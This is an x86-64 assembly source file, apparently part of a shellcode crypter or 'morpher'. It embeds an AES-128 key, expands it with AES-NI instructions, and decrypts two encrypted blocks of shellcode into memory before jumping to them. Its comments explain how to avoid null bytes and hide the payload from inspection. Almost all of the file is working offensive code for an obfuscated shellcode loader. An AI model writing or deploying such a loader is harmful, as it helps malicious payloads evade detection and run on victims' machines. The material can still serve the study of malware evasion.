#$ as shellcode.s -o shellcode.o
#$ ld shellcode.o -o shellcode

.globl _start
_start:

# let's store the key
movabs $0x1b614b73da6ac94a, %r14
# the first half of the key is reversed and goes to the R14, because Intel is little-endian and you can't store values directly to the XMM
movq %r14, %xmm0
# store it in the half of XMM0 (64 to 128 bits), it's pretty hackerish and undocumented since, XMM doesn't suppose to be modified directly, but with pointers
movabs $0xc3fdbc5e697e297b, %r15
# the second half of the key is each half-reversed and goes to the R15, because we need to swap it after
movq %r15, %xmm3
# store it in the half of XMM3
shufps $0x1b, %xmm0, %xmm0
# because XMM is 128 bits, we will put the first half of the key to the second half of XMM0 and its first half will be zeroed
shufps $0x1b, %xmm3, %xmm0
# we will put the first half of XMM3 to th first half of XMM0, thus the key is entirely stored in XMM0
# it's even more hackerish, but it's the best way I found to store an arbitrary value in the XMM without a pointer/buffer/location

# let's compute the key by expanding it since, we use AES
movaps %xmm0, %xmm5
pxor %xmm2, %xmm2
# erasing XMM2 is necessary, otherwise decryption might fail
# now the first round of the expansion
aeskeygenassist $1, %xmm0, %xmm1
# and the scheduling
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
# the end of the expansion
aesimc %xmm0, %xmm6
# same thing for the other 9 rounds since, we use 128-bit key
aeskeygenassist $2, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm7
aeskeygenassist $4, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm8
aeskeygenassist $8, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm9
aeskeygenassist $16, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm10
aeskeygenassist $32, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm11
aeskeygenassist $64, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm12
aeskeygenassist $128, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm13
aeskeygenassist $27, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm14
aeskeygenassist $54, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
# since it's the last round, the expansion ends here
movaps %xmm0, %xmm15
# I know that, all this could be optimized with a call to a macro (function), but I don't have time for this since, it needs to be obfuscated in order to eliminate all null bytes with jumps

# ok, now we can decrypt in ECB mode
# same routine as for th key goes for the code
movabs $0xb12ce73ee6d2f63b, %r14
# first half of the code
movq %r14, %xmm0
movabs $0xf6e4be6324a92bc8, %r15
# second half of the code (each half-reversed)
movq %r15, %xmm3
shufps $0x1b, %xmm0, %xmm0
shufps $0x1b, %xmm3, %xmm0

# the 10 round decryption
pxor       %xmm15, %xmm0
aesdec     %xmm14, %xmm0
aesdec     %xmm13, %xmm0
aesdec     %xmm12, %xmm0
aesdec     %xmm11, %xmm0
aesdec     %xmm10, %xmm0
aesdec     %xmm9,  %xmm0
aesdec     %xmm8,  %xmm0
aesdec     %xmm7,  %xmm0
aesdec     %xmm6,  %xmm0
aesdeclast %xmm5,  %xmm0

# finally, we can move the decrypted block to the memory
# the Linux location is 0x00600078 and since it contains null bytes, we dont want this for our shellcode, so we will juste make a subtraction of some non null byted values, in order to obtain the address we need
movabs $0xffffffffff599999, %rsi
#movabs $0xfffffffffef99689, %rax
movabs $0xffffffffff599921, %rax
sub %rax, %rsi
mov %rsi, %rbx
# we will save our pointer in RBX and not RAX, in order not to have zeroes
movaps %xmm0, (%rsi)
# GCC's address could be 0x600900 or 0x6001280 and it could be obtained directly from RDX, so for the morpher we will save the pointer from RDX to RSI, without any additional mathematical operation
# mov %rdx, %rsi
# movaps %xmm0, (%rsi)
    
# second block decryption juste like the first-one
movabs $0xbe28868e0cb06609, %r14
movq %r14, %xmm0
movabs $0x0c4943bf832b05aa, %r15
movq %r15, %xmm3
shufps $0x1b, %xmm0, %xmm0
shufps $0x1b, %xmm3, %xmm0

pxor       %xmm15, %xmm0
aesdec     %xmm14, %xmm0
aesdec     %xmm13, %xmm0
aesdec     %xmm12, %xmm0
aesdec     %xmm11, %xmm0
aesdec     %xmm10, %xmm0
aesdec     %xmm9,  %xmm0
aesdec     %xmm8,  %xmm0
aesdec     %xmm7,  %xmm0
aesdec     %xmm6,  %xmm0
aesdeclast %xmm5,  %xmm0

# move it after already written 16 bytes, using RBX, so we are not limited by the length (16 will be constant, so no zeroes)
add $16, %rbx
movaps %xmm0, (%rbx)
# however, in the morpher we will use RDX since, it contains the shellcode's address, thereby the shellcode will rewrite it-self
# add $16, %rdx
# movaps %xmm0, (%rdx)
# "Release The Kraken!" I mean, shellcode
jmpq *%rsi

